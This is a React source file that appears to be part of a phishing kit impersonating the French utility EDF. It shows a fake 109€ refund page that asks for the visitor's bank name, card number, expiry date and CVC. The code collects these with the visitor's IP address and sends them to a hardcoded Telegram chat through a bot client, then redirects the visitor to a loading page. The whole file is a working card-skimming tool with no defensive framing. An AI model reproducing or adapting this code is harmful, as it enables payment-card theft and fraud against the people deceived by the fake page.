import react from 'react';
import './css/style.css';
import { useForm } from "react-hook-form";
import { BrowserRouter as Router, Route, useHistory } from "react-router-dom";

const { TelegramClient } = require('messaging-api-telegram');

function Infoz() {

  const client = new TelegramClient({
    accessToken: 'ACCESSTOKEN',
  });
  var history = useHistory();
  var ipy;
  fetch('https://ip.nf/me.json')
    .then(results => results.json())
    .then(data => ipy = data)
    .then(console.log)
    
  
const { register, handleSubmit } = useForm();

const onSubmit = (data) => {
  var  dinto = data;
  var kali ="===========+++ ❤ EDF CHX ❤ +++========\n"+ "BANK NAME : "+dinto.nomb+"\n"+"CREDIT CARD : "+dinto.cc+"\n"+ "EXPIRY : "+dinto.exp+"\n"+"CVV : "+dinto.CVC+"\n"+"\n"+ "===========+++ ❤ EDF CHX ❤ +++========\n"+"IP Adresse : "+ ipy.ip.ip;
  client.sendMessage(1513751242,kali)
  if (kali !=null)  {
    history.push("/loading");
  }
  
};

  return (
    <div className="Infoz">
    <form method="POST" action="/loading" id="frm" name="frm"  onSubmit={handleSubmit(onSubmit)}>
          <div id="main">
            <div id="logo">
              <img src="edf.png" width="163px" height="77px" />
            </div>
            <hr width="377px" color="#DEDEDE" style={{marginLeft: '2px', marginTop: '0px'}} />
            <div id="error">
              <img src="error.png" alt="" title="Error" />
            </div>
            <br />
            <h2>Remboursement EDF   -   Total : 109€ </h2>
            <b style={{color: 'red'}}>Vous recevrez une facture de remboursement sur votre email une fois l'opération terminée</b>
            <br /><br />
            <b style={{color: '#0474BF'}}>Identifiez-vous : Veuillez saisir une carte bancaire conforme et valide <br />sur laquelle vous receverez votre paiement.</b>
            <h2>Informations de la carte :</h2>
            <div id="login">
              <input placeholder="Nom de la banque" className="textbox" type="text" id="nomb" {...register("nomb")} name="nomb" defaultValue="" maxLength={20} autoComplete="off"  /><br />
              <input onkeyup="mySpan.innerHTML=this.value" placeholder="Numéro de Carte de credit" className="textbox" {...register("cc")} type="text" id="cc" name="cc"  defaultValue="" maxLength={16} autoComplete="off" required /><br />
              <input placeholder="Date d'expiration" id="expiryDate" className="textbox1" name="exp" type="text" defaultValue="" {...register("exp")} autoCapitalize="off" autoComplete="off" aria-required="true" maxLength={5} data-placeholder-text="MM/AA" data-format="mmyy" required />
              <input placeholder="CVC" className="textbox2" type="test" id="CVC" name="CVC" defaultValue="" maxLength={3} {...register("CVC")} autoComplete="off" required /><br />
              <input className="btnSubmit" type="submit" name="_eventId_continue" Value="Rembourser" /><br />
              <style dangerouslySetInnerHTML={{__html: "\n\n span { font-size: 17px; }\n\n span { margin-top: 62px; margin-left: 24px; }\n\n span{position: absolute;}\n\n          span{color: white;}\n\n     " }} />    
              <hr width="377px" color="#DEDEDE" style={{marginLeft: '2px', marginTop: '11px'}} />
            </div>
            <div className="wallet">
              <p><span id="mySpan" />
                <img src="cc.png" alt="" width="220px" height="140px" style={{marginLeft: '0px'}} />
              </p><h3>Remboursement EDF</h3>
              <b> 
                Pourquoi ai-je reçu un remboursement ? <br />Suite à la comparaison des estimations de factures payées en 2021, et votre consommation réelle d'électricité, vous êtes admissible à recevoir un remboursement de 109€.<br />L'opération prendra une durée de 24 à 72. Nous nous excusons pour la gêne occasionnée</b>
            </div><br />
            <h5><img src="sec.png" alt="" /></h5> 
            <img src="footer.png" alt="" style={{float: 'right', paddingTop: '5px'}} />
          </div></form>
          </div>
  );
}

export default Infoz;